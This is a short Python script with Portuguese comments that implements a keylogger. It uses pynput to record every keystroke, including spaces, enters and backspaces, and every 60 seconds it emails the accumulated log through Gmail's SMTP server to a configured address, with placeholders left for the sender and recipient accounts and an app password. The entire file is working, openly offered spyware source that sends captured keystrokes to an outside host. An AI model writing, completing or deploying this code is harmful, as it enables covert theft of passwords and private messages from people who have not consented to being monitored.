from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#Configurações de e-mail
EMAIL_ORIGEM = "<conta de e-mail desejada>"
EMAIL_DESTINO = "<conta de e-mail desejada>"
SENHA_EMAIL = "<senha criada no app passwords - não a senha de acesso ao e-mail >"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""

    # Configurar timer para enviar e-mail a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log+=" "
        elif key == keyboard.Key.enter:
            log+="\n"
        elif key == keyboard.Key.backspace:
            log+="[<]"
        else:
            pass

# Começa o keylogger e envio de e-mail

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()